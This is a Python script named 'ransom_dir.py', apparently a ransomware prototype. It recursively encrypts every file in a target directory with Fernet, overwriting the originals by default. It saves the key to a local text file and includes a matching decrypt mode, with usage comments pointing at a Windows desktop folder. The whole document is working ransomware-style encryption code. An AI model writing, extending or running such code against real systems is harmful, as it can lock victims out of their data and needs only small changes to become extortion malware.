# python .\ransom_dir.py encrypt_dir "C:\Users\Admin\Desktop\test jasee" ow
# python .\ransom_dir.py decrypt_dir "C:\Users\Admin\Desktop\test jasee" .\jasee.txt  ow

import sys
import os
import shutil
from cryptography.fernet import Fernet, InvalidToken  # type: ignore

def generate_key(filename):
    """Generate and save a key."""
    key = Fernet.generate_key()
    with open(filename, 'wb') as filekey:
        filekey.write(key)
    return key

def load_key(filekey_name):
    """Load a key from a file."""
    try:
        with open(filekey_name, 'rb') as filekey:
            return filekey.read()  # key = bytes
    except FileNotFoundError:
        print(f"Error: No such key file: {filekey_name} in the current folder")
        return None

def encrypt_file(filename, key, overwrite=True):
    """Encrypt a single file."""
    print(f"Encrypting file: {filename}")
    f = Fernet(key)

    # Copy the file before overwriting it, if needed
    if not overwrite:
        shutil.copyfile(filename, filename + ".copy")

    # Read file contents and encrypt
    with open(filename, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)

    # Write the encrypted data back to the file
    with open(filename, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(filename, key):
    """Decrypt a single file."""
    print(f"Decrypting file: {filename}")
    f = Fernet(key)

    # Read file contents and decrypt
    with open(filename, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)

    # Write the decrypted data back to the file
    with open(filename, 'wb') as file:
        file.write(decrypted_data)

def encrypt_directory(directory, filekey_name, overwrite=True, manual=False):
    """Encrypt all files in a directory."""
    if not manual:
        print("Generating encryption key...")
        key = generate_key(filekey_name)
    else:
        key = load_key(filekey_name)
        if key is None:
            return

    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key, overwrite=overwrite)

    print("Directory encryption completed.")

def decrypt_directory(directory, filekey_name):
    """Decrypt all files in a directory."""
    key = load_key(filekey_name)
    if key is None:
        return

    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

    print("Directory decryption completed.")

if __name__ == "__main__":
    try:
        if sys.argv[1] == 'encrypt_dir':
            directory = sys.argv[2]
            overwrite = sys.argv[3] == 'ow'
            filekey_name = 'jasee.txt' if not len(sys.argv) > 4 else sys.argv[4]
            encrypt_directory(directory, filekey_name, overwrite=overwrite)

        elif sys.argv[1] == 'decrypt_dir':
            directory = sys.argv[2]
            filekey_name = sys.argv[3]
            decrypt_directory(directory, filekey_name)

        else:
            print("Error: The 1st argument must be 'encrypt_dir' or 'decrypt_dir'")

    except IndexError:
        print("Error: Usage:")
        print("- Encrypt directory: encrypt_dir directory_path ow/c [keyfile_name]")
        print("- Decrypt directory: decrypt_dir directory_path keyfile_name")
